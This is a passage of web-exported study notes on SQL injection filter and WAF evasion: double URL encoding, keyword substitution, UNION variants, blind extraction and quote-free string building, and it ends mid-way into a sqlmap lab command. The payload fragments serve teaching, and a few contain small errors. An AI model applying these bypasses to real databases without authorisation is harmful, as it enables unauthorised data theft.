+</code></pre><h3 id="aa1e80fe-7efb-4587-8091-1389aba7cfc9" class=""><strong>Circumventing by Encoding</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#circumventing-by-encoding"></a></strong></h3><p id="c7297983-bf4c-4904-8c33-b15afbce0d2c" class="">It all depends on how the application processes data</p><ul id="a6e1600e-472c-4a32-b4c3-e5fe6206ad83" class="bulleted-list"><li style="list-style-type:disc">between the attacker and the application, there are many layers, such as a proxy, firewall, etc. If some of these layers handle the encoding differently, there could be a possible bypass</li></ul><p id="f8dc9dff-fdf7-41da-adf8-4414620bdb29" class="">URL Encoding:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3b7f6242-f384-4dd8-abec-a49f77e67afc" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Usually when the requests are sent through the internet via HTTP, they are URL encoded.
+- In this case we can send the entire string URL-encoded
+</code></pre><p id="b1ab87ae-3afb-4fc1-aa7e-fa5507d746c2" class="">Double URL Encoding:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d920723b-9a9a-42c4-9d9b-61286448a94d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all"># If u encode a URL-Encoded string, they u are performing a Double URL-Encoding
+
+s = %73 &gt; %2573
+</code></pre><blockquote id="e75f4819-221b-43e0-9bfa-d9cbfc62bbee" class="">IN this case, if the filter decodes the request the first time and applies the rules, it will not find anything dangerous</blockquote><blockquote id="54486d8b-1a36-4142-aeb6-6e5aed774135" class="">Then when the application receives the request, it will decode the contents and trigger the malicious request</blockquote><h3 id="800c7e11-a8a7-4511-9008-7873c875f163" class=""><strong>Replaced Keywords</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#replaced-keywords"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b560e3f-3f54-4a1a-853f-eb2f5464f47d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Booleans &gt; AND, OR
+- AND = &amp;&amp;
+- OR  = ||
+# only in MySQL and MSSQL
+WHERE ID=x &amp;&amp; 1=1
+WHERE ID=x || 1=1
+
+# If &amp;&amp; and || are filtered, then u must use &#x27;UNION&#x27;
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="648e809d-8149-4a15-88bd-93506484ffc8" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">UNION &gt; Simple case
+# We can use many variants to elude these kind of filters:
+
+UNION(SELECT &#x27;VALUES&#x27;...) &amp;&amp;
+UNION ALL SELECT ...
+UNION DISTINCT SELECT ...
+/*!00000 UNION*//*!00000 SELECT*/ ...
+</code></pre><p id="ce422bd1-5a96-4578-909a-38a23676257b" class="">WHen the <strong>UNION</strong> is filtered, we must switch to blind SQLi exploitation:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f12d9621-dc0e-43f8-a5a0-4fad874f1987" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">(SELECT id FROM users LIMIT 1)=&#x27;5 ...
+</code></pre><p id="0b620289-482b-4a07-8e38-30fbed9a0c92" class="">In Oracle:</p><p id="6a1d9367-4df0-43e6-ab41-d157d1130415" class="">→ https://docs.oracle.com/cd/B28359_01/server.111/b28286/queries004.htm#SQLRF52323</p><ul id="25261176-060f-4017-8eed-e90de591abb3" class="bulleted-list"><li style="list-style-type:disc">We can use <strong>INTERSECT</strong> or <strong>MINUS</strong> operators</li></ul><p id="007e5654-d2ff-4dc0-a6b1-5ca641785a76" class="">WHERE, GROUP, LIMIT, HAVING:</p><ul id="058d2390-81dc-4990-b738-bc8ed271328b" class="bulleted-list"><li style="list-style-type:disc">Useful keywords to select a specific entry</li></ul><p id="bfa658f5-8a3b-4d5b-b04e-1b47a431c9b7" class="">If the filter blocks <strong>WHERE</strong> keyword, we can alternatively use <strong>GROUP BY</strong> + <strong>HAVING</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="af9764b8-18a0-4121-9ab1-0f8871f5cf58" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT id FROM users GROUP BY id HAVING id=&#x27;5 ...
+</code></pre><p id="c0797247-c2d1-4840-bcdf-74c5519ccaf1" class="">If <strong>GROUP BY</strong> is filtered, we must revert to blind SQLi:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6b3ab095-f41d-4890-8f1c-23d75adb83d6" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">AND length((select first char)=&#x27;a&#x27;) //0/1 &gt; true/false
+</code></pre><p id="953362fc-9a2c-4248-8052-3a769ac640d2" class="">If <strong>HAVING</strong> is filterd, in this case we must leverage functions like <strong>GROUP_CONCAT</strong>, functions that manipulates strings, etc. Of course, all of this is blind!</p><p id="35b51b19-9b90-45a2-89c4-bf31095db8da" class="">If <strong>SELECT</strong> is filtered, The exploitation can vary and really depends upon the injection point.</p><p id="7a268d5a-eda7-483e-b947-eb1b7d53c6ed" class="">You need to use functions that manipulate FILES such as:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="742c462c-2d60-4c23-8dec-309b699fed37" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">load_files //in mysql
+</code></pre><p id="366e51c8-4385-4911-adc5-8408243d34a3" class="">Another option, brute-force or guess the column names by appending other <strong>WHERE</strong> condition such as:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e9a74064-6353-4af1-9ecf-7c7964ff38fc" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">AND COLUMN IS NOT NULL ...
+</code></pre><p id="624ca578-ace1-40cb-91d7-7fef72410f5f" class="">Alternatively, being able to invoke the <strong>stored procedure analyse()</strong></p><p id="57bb8676-c647-40f3-b1b7-5a6c364f82f4" class="">→ http://dev.mysql.com/doc/refman/5.7/en/procedure-analyse.html</p><p id="935d9008-f91d-4594-8ddb-29fabf33850f" class="">This <strong>sproc</strong> returns juicy information about the query just executed:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ffe925c0-f801-4ed3-9484-75a9eb06136f" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT * FROM employees procedure analyse()
+</code></pre><h2 id="d4ce0588-5bcd-4b04-a02d-36dc37aa4ac2" class=""><strong>Bypassing Function Filters</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#bypassing-function-filters"></a></strong></h2><p id="77382886-2326-43bf-a761-877c2f0ccb27" class="">Lets now unpack useful techniques and alternative functions For use in these types of scenarios</p><h3 id="e63eb740-8ee8-4dc3-b483-8ce547d05403" class=""><strong>Building Strings</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#building-strings"></a></strong></h3><p id="3ed73a19-82a3-475f-892d-a346ac26a265" class="">In the DBMS Gadget chapter, we discussed how to generate strings but, we used quotes. Building strings without quotes is a little bit tricky:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6a433371-63e4-42fb-9d23-e6a9fb11f5d6" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- UNHEX
+- HEX
+- CHAR
+- ASCII
+- ORD
+</code></pre><p id="21d0a2cc-df85-4fc3-a422-c7cedc0620ab" class="">UNHEX is useful in translating hexadecimal numbers to string:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="eee7cb7f-e1ef-42bf-a639-5ef5a028fcc6" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- http://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_unhex
+
+SUBSTR(USERNAME,1,1)=UNHEX(48)
+SUBSTR(USERNAME,1,2)=UNHEX(4845)
+...
+SUBSTR(USERNAME,1,5)=UNHEX(&#x27;48454C4C4F&#x27;)
+SUBSTR(USERNAME,1,2)=0x48454C4C4F
+</code></pre><p id="18ecd4f2-95ee-499e-9c52-13c855fb235a" class="">HEX function is useful to convert o hexadecimal:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4a4543a9-be5c-4031-a679-7cb5548313bc" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- http://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_hex
+
+HEX(SUBSTR(USERNAME,1,1))=48
+HEX(SUBSTR(USERNAME,1,2))=4845
+...
+HEX(SUBSTR(USERNAME,1,5))=&#x27;48454C4C4F&#x27;
+</code></pre><p id="c50c6ef6-0f40-42e5-b6fe-d59e983d62c3" class="">CHAR can also be used:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3677a9a1-90e2-43b2-bd60-4a3414cf0dbc" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- http://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_char
+
+SUBSTR(USERNAME,1,1)=CHAR(72)
+SUBSTR(USERNAME,1,2)=CHAR(72,69)
+...
+SUBSTR(USERNAME,1,1)=CONCAT(CHAR(72),CHAR(69))
+</code></pre><p id="8df3657f-69ff-4579-9ccc-04d8e7c20dba" class="">ASCII and ORD: twin functions:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1336c77d-31c3-46d3-926d-accbed5dfe69" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- http://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_ascii
+- http://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_ord
+
+ASCII(SUBSTR(USERNAME,1,1))=48
+ORD(SUBSTR(USERNAME,1,1))=48
+</code></pre><p id="1a3c5887-a926-426e-8052-a543332323b4" class="">CONV: mySQL offers an interesting method in returning the string representation of a number from two bases</p><ul id="9496e500-0e22-4e6e-9359-978b9c0ae889" class="bulleted-list"><li style="list-style-type:disc">http://dev.mysql.com/doc/refman/5.7/en/mathematical-functions.html#function_conv</li></ul><blockquote id="0ee4e818-6e89-4b2e-84ff-54fc367238a9" class="">The highest base we can use is 36</blockquote><p id="675cdc8c-a879-4afd-b760-04a865198be7" class="">We cannot use For <strong>unicode</strong> characters; however, at least we can generate a string from a-zA-Z0-9:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e3540ec9-856b-405d-8173-5692a8318ca2" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">CONV(10,10,36) //&#x27;a&#x27;
+CONV(11,10,36) //&#x27;b&#x27;
+</code></pre><p id="07a4c2c6-213f-4e8c-b9f1-90cd308fe884" class="">We can mix the results with <strong>upper</strong> and <strong>lower</strong> functions to retrieve the respective representation:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8e11e356-c783-4d58-a451-55fd228f4d62" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">LOWER(CONV(10,10,36)) #&#x27;a&#x27;
+LCASE(CONV(10,10,36)) #&#x27;a&#x27;
+UPPER(CONV(10,10,36)) #&#x27;A&#x27;
+UCASE(CONV(10,10,36)) #&#x27;A&#x27;
+...
+</code></pre><h3 id="fc26ed1f-5d01-43bb-89d0-bef28a31b2f7" class=""><strong>Brute-force Strings</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#brute-force-strings"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="abada84c-3b47-4f20-b56d-834bcc10f21d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- LOCATE
+- INSTR
+- POSITION
+</code></pre><p id="74415296-8ff9-45a9-a0f3-5fca00454100" class="">If u cannot build a string, u can try to locate either a segment or an entire string using functions that return the position of the first occurrence of substrings, and then use conditional statements For the Boolean condition.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="75b4a905-14e1-419f-a244-a5a3421048ec" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">IF(LOCATE(&#x27;H&#x27;,SUBSTR(USERNAME,1,1)),1,0)
+# u can also use functions &#x27;INSTR&#x27; and &#x27;POSITION&#x27;
+</code></pre><h3 id="eeb97076-5b24-432b-8a90-e7daa8155fec" class=""><strong>Building Substring</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#building-substring"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c570d205-3682-48f1-9a95-5592f7dd51b2" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- SUBSTR
+- MID
+- SUBSTRING
+</code></pre><p id="6aff84f7-c410-4fff-bed8-79b2e215055b" class="">MID is a synonym of SUBSTRING, which is a synonym of SUBSTR:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2ae4e982-f274-4208-982e-5fc6b8161423" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">[SUBSTR|MID|SUBSTRING](&#x27;HELLO&#x27; FROM 1 FOR 1)
+</code></pre><p id="922809f7-7cb1-4c45-a53c-ca8ca8518bbd" class="">Alternatively, functions <strong>LEFT</strong> and <strong>RIGHT</strong></p><p id="11b409e2-1872-48f1-a353-03bc4f99e30a" class="">→ http://dev.mysql.com/doc/refman/5.0/en/string-functions.html#function_left</p><p id="14493e30-52cd-4686-ae78-91779110e2aa" class="">→ http://dev.mysql.com/doc/refman/5.0/en/string-functions.html#function_right</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7ddf9f9d-3a0d-4cd6-9cfa-aee67b54a268" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">[LEFT|RIGHT](&#x27;HELLO&#x27;,2) //HE or LO
+</code></pre><p id="81ae82d9-8c39-4d45-a3ee-0e6367060d86" class="">More options functions like <strong>RPAD</strong> and <strong>LPAD</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="529b4e37-924c-4ee9-9188-f2f574088f09" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">[LPAD,RPAD](&#x27;HELLO&#x27;,6,&#x27;?&#x27;) //?HELLO or HELLO?
+[LPAD,RPAD](&#x27;HELLO&#x27;,1,&#x27;?&#x27;) //H
+...
+[LPAD,RPAD](&#x27;HELLO&#x27;,5,&#x27;?&#x27;) //HELLO
+</code></pre><h2 id="73a588b6-f793-4088-ae7b-da2ad6052a2f" class=""><strong>Labs</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#labs"></a></strong></h2><p id="125550e0-5e51-43b5-9105-37a86f049aa7" class="">Note: Different sqlmap versions may require different options/flags. For example lab 4 may be solved using the below:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a8646512-9795-4fdf-8a57-18b5d94ceb78" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">sqlmap -u 